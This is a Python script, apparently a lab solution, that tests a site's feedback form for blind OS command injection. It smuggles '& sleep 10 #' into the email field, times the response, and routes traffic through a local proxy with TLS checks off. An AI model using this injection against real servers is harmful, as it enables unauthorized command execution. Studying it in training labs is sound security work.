# Blind OS command injection with time delays
import requests #pip install requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup 

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }
def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies = proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def check_command_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@gmail.com & sleep 10 #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name':'test', 'email': command_injection, 'subject':'test', 'message':'test'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if (res.elapsed.total_seconds() >= 10):
        print("(+) Email field vulnerable to timed-based command injection")
    else:
        print("(-) Email field vulnerable not to timed-based command injection")

def main():
    if len(sys.argv) != 2 :
        print ("[+] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("(+) Checking if email parameter is vulnerable to time-based command injection...")
    s = requests.Session()
    check_command_injection(s, url)

if __name__ == '__main__':
    main()
